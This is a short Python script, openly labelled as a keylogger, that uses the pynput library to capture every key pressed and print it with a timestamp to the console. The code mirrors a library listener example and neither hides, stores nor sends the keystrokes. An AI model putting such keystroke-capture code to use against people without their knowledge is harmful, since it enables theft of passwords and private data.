from pynput import keyboard
from datetime import datetime
print(f"{datetime.now()} - Started keylogger")
def on_press(key):
    try:
        print(f'{datetime.now()} alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'{datetime.now()} special key {key} pressed')

# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press)
listener.start()